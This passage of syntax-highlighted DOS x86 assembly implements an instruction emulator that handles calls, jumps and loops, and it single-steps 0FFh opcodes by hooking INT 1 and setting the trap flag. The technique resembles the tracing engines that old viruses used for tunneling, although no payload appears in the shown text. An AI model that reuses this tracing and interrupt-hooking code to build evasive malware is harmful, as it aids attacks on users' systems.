        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get</span><span class="sc4">&amp;</span><span class="sc5">exec_instruction</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; short CALL instruction</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@Scall</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_theresacall</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get</span><span class="sc4">&amp;</span><span class="sc5">exec_instruction</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; FAR CALL instruction</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@Fcall</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_theresacall</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movsd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">_ip</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movsd</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get</span><span class="sc4">&amp;</span><span class="sc5">exec_instruction</span><span class="sc0">


            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; Short IP jump...</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@Sjmp</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Short jump to somewhere</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; Sets new IP address</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get</span><span class="sc4">&amp;</span><span class="sc5">exec_instruction</span><span class="sc0">



            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; far jump instruction</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@Fjmp</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get</span><span class="sc4">&amp;</span><span class="sc5">exec_instruction</span><span class="sc0">


            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; conditional jumps</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@Jojmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jo</span><span class="sc0">      </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">

</span><span class="sc5">@Jnojmp</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; Jump if not overflow</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jno</span><span class="sc0">     </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Jbjmp</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Jump if below</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Jnbjmp</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; Jump if not below</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Jzjmp</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Jump if zero</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Jnzjmp</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; Jump if not zero</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Jbejmp</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; etc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Jajmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Jsjmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Jnsjmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Jpejmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jpe</span><span class="sc0">     </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">


            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; LOOPNZ instruction</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">
</span><span class="sc5">@Mloopnz</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; Will jump if CX=1 ( to 0 ), or if Zero flag=1</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_cx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; =0 ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@FinalLoop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@FinalLoop</span><span class="sc0">             </span><span class="sc1">; Zero ?</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; short jump instruction ( inside )</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@Njmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@Add_or_sub_IP</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get</span><span class="sc4">&amp;</span><span class="sc5">exec_instruction</span><span class="sc0">


</span><span class="sc5">@Jpojmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jpo</span><span class="sc0">     </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Jljmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Jgejmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jge</span><span class="sc0">     </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Jlejmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@jgjmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@getflags</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
</span><span class="sc5">@Mjcxz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_cx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Njmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@FinalLoop</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; near jump emulation ( for some )</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@Add_or_sub_IP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@Add_IP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@Add_IP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; 0FFh instruction</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">
</span><span class="sc5">opcodeFFflag</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@0FFh</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; 0ffh beggining instructions are handled on a different way than the</span><span class="sc0">
</span><span class="sc1">;others; as we see, 50% of this instructions cannot be emulated by the</span><span class="sc0">
</span><span class="sc1">;executor and need a special consideration: beeing 80h opcodes, a specific</span><span class="sc0">
</span><span class="sc1">;routine for each one would mean a quantity of bytes we don't have, nor</span><span class="sc0">
</span><span class="sc1">;want. So, this is solved by just debugging the next instruction on simple</span><span class="sc0">
</span><span class="sc1">;step mode, tracing; the instructions with 0ffh, anyway, do not represent</span><span class="sc0">
</span><span class="sc1">;any danger for the stability of the emulation even if they are just traced.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">opcodeFFflag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3501h</span><span class="sc0">        </span><span class="sc1">; Int1h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2501h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">where2jump</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_pref</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@PrefijoNoPresente</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">@@PrefijoNoPresente</span><span class="sc4">:</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">where2jump</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">@Debugging1</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">


        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@continue_tra</span><span class="sc0">

</span><span class="sc5">@set_registers_emu</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">_flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10d</span><span class="sc0">
</span><span class="sc5">push_em_shit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">push_em_shit</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@continue_tra</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss2</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp2</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">

</span><span class="sc6">cli</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">

</span><span class="sc5">where2jump</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">@@replace</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; After execution is made.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp2</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

        </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc5">@retornodealla</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get</span><span class="sc4">&amp;</span><span class="sc5">exec_instruction</span><span class="sc0">


</span><span class="sc5">@Debugging1</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">


        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">opcodeFFflag</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@Debno</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
